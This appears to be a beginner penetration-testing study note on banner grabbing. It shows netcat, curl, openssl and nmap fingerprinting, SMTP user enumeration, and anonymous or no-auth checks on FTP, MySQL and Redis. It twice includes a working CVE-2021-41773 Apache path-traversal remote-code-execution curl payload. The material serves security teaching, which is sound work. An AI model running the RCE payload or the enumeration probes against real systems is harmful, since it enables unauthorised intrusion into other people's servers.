---
tags: [vapt, recon, beginner]
difficulty: beginner
module: "05 - Recon"
topic: "05.22 Banner Grabbing"
---

# 05.22 — Banner Grabbing

## What is it?

A "banner" is the information a server sends when you first connect to it — before any authentication. Banners often include the service name, version number, operating system, and sometimes configuration details. Banner grabbing is the act of capturing this information for fingerprinting.

---

## Why Banners Matter

```
BANNER:         SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
                ↓
VERSION:        OpenSSH 7.2p2 on Ubuntu 16.04
                ↓
CVE SEARCH:     CVE-2016-6210 → Username enumeration via timing
                CVE-2017-15906 → File creation via FTP/SSH gateway
                ↓
ATTACK:         Username enumeration → credential stuffing!

ANOTHER EXAMPLE:
  HTTP HEADER:  Server: Apache/2.4.49 (Debian)
  CVE:          CVE-2021-41773 → Path traversal → RCE!
  ATTACK:       curl target.com/cgi-bin/.%2e/.%2e/bin/sh -d "echo Content-Type: text/plain; id"
```

---

## Manual Banner Grabbing Techniques

### Netcat

```bash
# GENERIC TCP BANNER GRAB:
nc -nv target.com 22
nc -nv target.com 80
nc -nv target.com 21

# ADD HTTP REQUEST TO TRIGGER HTTP BANNER:
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# TIMEOUT (so nc doesn't hang):
nc -w 5 target.com 22   # 5 second timeout

# BANNER EXAMPLES:
# FTP:   220 ProFTPD 1.3.5 Server
# SSH:   SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
# SMTP:  220 mail.target.com ESMTP Postfix (Ubuntu)
# POP3:  +OK Dovecot ready.
# IMAP:  * OK [CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN] Dovecot ready.
# MySQL: ...5.7.36-0ubuntu0.18.04.1...
```

### Telnet (for cleartext services)

```bash
# FTP BANNER:
telnet target.com 21

# SMTP BANNER:
telnet target.com 25

# HTTP BANNER:
telnet target.com 80
HEAD / HTTP/1.0
[press Enter twice]
```

### curl (HTTP/HTTPS)

```bash
# HTTP HEADERS ONLY:
curl -sI https://target.com

# FOLLOW REDIRECTS:
curl -sIL https://target.com

# SHOW FULL TRANSACTION:
curl -v https://target.com 2>&1 | head -50

# LOOK FOR:
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3
# X-Powered-By: Express
# X-Generator: Drupal 9
# X-AspNet-Version: 4.0.30319

# CURL WITH FAKE USER-AGENT (bypass basic WAF):
curl -sI -A "Mozilla/5.0" https://target.com

# ALL HEADERS INCLUDING RESPONSE BODY:
curl -D - https://target.com -o /dev/null
```

### OpenSSL (HTTPS / TLS banners)

```bash
# TLS HANDSHAKE INFO + SERVER CERT:
openssl s_client -connect target.com:443 2>/dev/null | head -50

# THEN SEND HTTP REQUEST:
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  head -30
# Shows: TLS version, cipher suite, certificate details, server cert CN

# GET SERVER CERT DETAILS:
openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -text | grep -E "Issuer|Subject|Not Before|Not After"

# CHECK TLS VERSION SUPPORT:
openssl s_client -connect target.com:443 -tls1 2>&1 | grep "Handshake\|CONNECTED"
openssl s_client -connect target.com:443 -tls1_1 2>&1 | grep "Handshake\|CONNECTED"
openssl s_client -connect target.com:443 -tls1_2 2>&1 | grep "CONNECTED"
openssl s_client -connect target.com:443 -tls1_3 2>&1 | grep "CONNECTED"
# TLS 1.0/1.1 supported → weak TLS finding!
```

---

## Automated Banner Grabbing Tools

### Nmap -sV (Service Version)

```bash
# ALREADY COVERED IN 21, BUT FOR BANNERS:
nmap -sV --script=banner target.com

# BANNER SCRIPT SPECIFICALLY:
nmap --script=banner target.com -p 21,22,25,80,443,3306

# EXAMPLE BANNER SCRIPT OUTPUT:
# 21/tcp  open  ftp     ProFTPD 1.3.5b
# |_banner: 220 FTP Server Ready
# 22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
# |_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
# 25/tcp  open  smtp    Postfix smtpd
# |_banner: 220 mail.target.com ESMTP Postfix
```

### Netcat Batch Grabbing

```bash
# BATCH GRAB FROM OPEN PORTS LIST:
cat open-ports.txt | while IFS=: read host port; do
  banner=$(echo "" | nc -w 3 "$host" "$port" 2>/dev/null | head -1)
  [ -n "$banner" ] && echo "$host:$port → $banner"
done

# QUICK HTTP BANNER FROM IP LIST:
cat ips.txt | while read ip; do
  server=$(curl -sI "http://$ip" --connect-timeout 3 | grep -i "^server:")
  [ -n "$server" ] && echo "$ip → $server"
done
```

### Whatweb (HTTP Technology Grabber)

```bash
whatweb https://target.com
# Shows all detected technologies + versions from headers + HTML

whatweb -a 3 https://target.com  # aggressive (more requests)
```

---

## Service-Specific Banner Grabbing

### SSH

```bash
nc -nv target.com 22
# SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
#         ^VERSION      ^OS HINT

# Version → check against CVE database:
searchsploit openssh 7.9
# or: https://cve.mitre.org search
```

### FTP

```bash
nc -nv target.com 21
# 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [127.0.0.1]
# → "Default Installation" → default credentials!

# ANONYMOUS FTP CHECK:
ftp target.com
# When asked for username: anonymous
# When asked for password: anything@example.com
# If logged in → anonymous FTP enabled!
nmap --script=ftp-anon target.com -p 21
```

### SMTP

```bash
nc target.com 25
# 220 mail.target.com ESMTP Postfix (Ubuntu)
# ^ Full hostname → additional subdomain found!

# ENUMERATE USERS VIA SMTP:
telnet target.com 25
HELO test.com
VRFY admin@target.com     # 250 = user exists, 550 = doesn't exist
EXPN mailinglist@target.com  # expand mailing list
```

### MySQL

```bash
nc -nv target.com 3306
# Binary banner but includes version string:
strings /dev/stdin <(nc -nv -w 3 target.com 3306) | head -5
# ...5.7.36-0ubuntu0.18.04.1...

# MySQL no-auth test:
mysql -h target.com -u root --password= 2>&1 | head -5
```

### Redis

```bash
nc -nv target.com 6379
# After connect, Redis prompts immediately
# Type: INFO server
# Returns all server info including version!

# CHECK AUTH REQUIRED:
redis-cli -h target.com ping
# PONG → no auth! Critical finding!
```

---

## What to Do With Banner Information

```
DISCOVERED: Apache/2.4.49 (Debian)

STEP 1: Search CVEs
  searchsploit apache 2.4.49
  → Exploit: CVE-2021-41773 Path Traversal/RCE

STEP 2: Find PoC
  searchsploit -m 50406  # copy exploit to current dir

STEP 3: Test (with authorization!)
  curl "https://target.com/cgi-bin/.%2e/.%2e/bin/sh" \
    -d "echo Content-Type: text/plain; echo; id"
    
STEP 4: Report
  Title: Apache 2.4.49 Path Traversal (CVE-2021-41773)
  Evidence: Server header shows Apache/2.4.49
  PoC: [curl command above]
  CVSS: 9.8 Critical
```

---

## Related Notes
- [[21 - Port Scanning with Nmap]] — discovering open ports
- [[23 - Service Version Detection]] — deeper version analysis
- [[14 - Technology Fingerprinting]] — web tech fingerprinting
- [[53 - Server header]] — HTTP Server header attacks
